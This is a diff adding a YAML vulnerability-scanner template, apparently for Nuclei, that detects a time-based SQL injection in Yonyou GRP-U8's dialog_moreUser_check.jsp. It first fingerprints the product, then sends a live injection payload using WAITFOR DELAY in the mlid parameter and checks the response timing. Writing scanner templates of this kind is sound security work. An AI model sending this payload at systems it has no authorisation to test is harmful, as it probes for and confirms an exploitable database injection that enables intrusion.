@@ -1,0 +1,48 @@
+id: poc-yaml-yongyou-grp-u8-dialog-moreUser-check-sqli
+info:
+  name: 用友GRP-U8 dialog_moreUser_check SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in 用友 GRP-U8 dialog_moreUser_check endpoint.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: check-grp-u8
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "GRP-U8"
+
+  - id: sqli-test
+    method: GET
+    path:
+      - "{{BaseURL}}/u8qx/dialog_moreUser_check.jsp?mlid=1';WAITFOR+DELAY+'0:0:{{t1}}'--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
